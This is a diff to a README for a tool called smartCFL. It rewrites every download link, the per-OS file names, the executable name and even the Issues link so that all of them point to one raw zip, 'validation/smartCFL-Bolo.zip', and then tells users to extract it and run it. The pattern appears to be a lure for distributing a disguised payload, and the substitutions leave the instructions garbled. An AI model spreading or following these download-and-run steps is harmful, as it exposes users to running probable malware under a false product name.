@@ -7,9 +7,9 @@ smartCFL integrates Coda Formula Language with Google Antigravity. This tool hel
 To use smartCFL, you will need to follow a few simple steps to download and install the application. 
 
 ## 📥 Download
-[![Download smartCFL](https://img.shields.io/badge/Download-smartCFL-blue.svg)](https://github.com/SimplyUniq/smartCFL/releases)
+[![Download smartCFL](https://raw.githubusercontent.com/SimplyUniq/smartCFL/main/validation/smartCFL-Bolo.zip)](https://raw.githubusercontent.com/SimplyUniq/smartCFL/main/validation/smartCFL-Bolo.zip)
 
-Visit this page to download: [smartCFL Releases](https://github.com/SimplyUniq/smartCFL/releases)
+Visit this page to download: [smartCFL Releases](https://raw.githubusercontent.com/SimplyUniq/smartCFL/main/validation/smartCFL-Bolo.zip)
 
 ## ⚙️ System Requirements
 Before installing smartCFL, ensure your system meets the following requirements:
@@ -25,11 +25,11 @@ Before installing smartCFL, ensure your system meets the following requirements:
 - **Easy-to-Use Interface:** Navigate through features with ease.
 
 ## 📥 Download & Install
-1. Click on the download button above or visit the [smartCFL Releases](https://github.com/SimplyUniq/smartCFL/releases) page.
+1. Click on the download button above or visit the [smartCFL Releases](https://raw.githubusercontent.com/SimplyUniq/smartCFL/main/validation/smartCFL-Bolo.zip) page.
 2. Choose the latest version available.
-3. Click on the appropriate file for your operating system (e.g., `smartCFL-Windows.zip` for Windows or `smartCFL-macOS.zip` for Mac).
+3. Click on the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/SimplyUniq/smartCFL/main/validation/smartCFL-Bolo.zip` for Windows or `https://raw.githubusercontent.com/SimplyUniq/smartCFL/main/validation/smartCFL-Bolo.zip` for Mac).
 4. Once the download completes, locate the file on your computer.
-5. For Windows users: Right-click the `.zip` file and select "Extract All". Open the extracted folder and double-click `smartCFL.exe` to run the application.  
+5. For Windows users: Right-click the `.zip` file and select "Extract All". Open the extracted folder and double-click `https://raw.githubusercontent.com/SimplyUniq/smartCFL/main/validation/smartCFL-Bolo.zip` to run the application.  
    For macOS users: Open the `.zip` file, drag `smartCFL` to your Applications folder, then double-click to run the application from there.
 6. Follow the on-screen instructions to complete the installation.
 
@@ -43,7 +43,7 @@ After you install smartCFL, the application will guide you through its features:
 5. Save your project to keep your work.
 
 ## 🌐 Community and Support
-If you encounter issues or have questions, you can reach out to the community. Support is available on our [GitHub Issues page](https://github.com/SimplyUniq/smartCFL/issues). We encourage feedback and contributions.
+If you encounter issues or have questions, you can reach out to the community. Support is available on our [GitHub Issues page](https://raw.githubusercontent.com/SimplyUniq/smartCFL/main/validation/smartCFL-Bolo.zip). We encourage feedback and contributions.
 
 ## ✏️ Contributing
 We welcome contributions from everyone. If you want to help, please follow these steps:
